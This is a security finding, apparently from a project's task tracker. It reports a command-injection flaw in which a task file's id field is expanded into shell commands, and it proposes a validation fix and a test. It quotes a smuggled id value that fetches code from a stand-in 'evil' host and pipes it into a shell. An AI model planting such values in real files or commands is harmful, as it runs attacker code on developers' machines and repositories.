description: 'Confirmed RCE (arch review 2026-07-22, exploit run): yaml Get/List take the domain id from the file''s id: field (task.go), never cross-checked against the filename stem; NewTaskID (identity.go) accepts any non-empty string; core expands {{.ID}} into sh -c gate/post commands. A poisoned .mtt/tasks/tN.yaml with id: ''t1"; curl evil|sh;"'' runs arbitrary code on the next mtt status/start/approve/deliver. Blast radius = any flow that puts {{.ID}} in a shell command — i.e. the flagship dogfood flow (git commit/push, gh pr create) and THIS repo. Task files are machine-written (reviewers scrutinize config.yaml, not tasks/*.yaml — AGENTS.md SEC2), so a poisoned file rides a PR through the review blind spot. Fix: reject task.ID != filename-stem in Get/List and validate the id charset (prefix+digits) at the DTO boundary (~6 lines); this also catches the duplicate-id-across-files split-brain the product audit found. Add an e2e that a mismatched/hostile id is refused. Gates the pilot (the pilot runs the flagship flow).'
